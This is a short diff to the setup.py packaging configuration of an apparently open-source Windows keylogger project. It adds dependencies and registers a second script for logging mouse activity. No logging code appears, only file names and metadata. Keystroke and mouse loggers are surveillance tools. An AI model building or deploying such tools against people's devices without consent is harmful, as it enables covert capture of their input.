@@ -11,9 +11,9 @@ config = {
     'download_url': 'https://github.com/adisakshya/keylogger',
     'author_email': 'adisakshya98@gmail.com',
     'version': '1.0',
-    'install_requires': ['pynput'],
-    'packages': ['pynput'],
-    'scripts': ['bin/keylogger-windows.py'],
+    'install_requires': ['pynput', 'setuptools', 'distutils'],
+    'packages': ['pynput', 'logging'],
+    'scripts': ['bin/keylogger-windows.py', 'bin/mouselogger-windows.py'],
     'name': 'keylogger'
     }
 
